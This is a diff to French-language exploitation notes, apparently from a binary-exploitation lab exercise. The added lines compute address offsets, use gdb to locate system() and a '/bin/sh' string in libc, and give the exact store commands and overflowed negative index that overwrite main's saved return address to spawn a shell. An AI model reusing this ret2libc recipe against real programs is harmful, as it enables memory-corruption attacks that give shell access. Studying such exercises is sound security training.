@@ -33,7 +33,12 @@ nb = (x - arg_8h) / 4
 
 arg_8h address : 0xffffd554
 printf jmp address : 0x804a000
-(0x804a000 - 0xffffd554) / 4
+(0xffffd554 - 0x804a000) / 4
+
+0xffffd554+ 0x804a000 + (0x804a000 -  0x8047414)
+134520832 + 11244 = 134532076 => i : -2113850576 address modified : 0x804a0d4
+134532076 - 212 =   134531884
+
 
 => On peux reecrire sur la table de function !
 
@@ -88,3 +93,27 @@ Input command: store
 address read_number : 0x080486d7
 
 nb = (0x080486d7 - 0xffffd414)
+
+
+================ REMPLACER EIP DU MAIN PAR SYSTEM ========================
+eip main : 0xffffd5dc
+i : -2147483534 => on reecrit eip du main avec ret2libc
+
+#ret2libc
+system is at : 0xf7e6aed0 => 4159090384
+libc-2.15.so : 0xf7e2c000
+15d7ec /bin/sh
+=> /bin/sh is at 0xf7e2c000 + 0x15d7ec = 0xf7f897ec => 4160264172
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:      "/bin/sh"
+
+#put index
+Input command: store
+ Number: 4159090384 #system address
+ Index: -2147483534 #114 * 4 in overflow
+
+Input command: store
+ Number: 4160264172 #/bin/sh
+ Index: 116
+
+Input command: quit
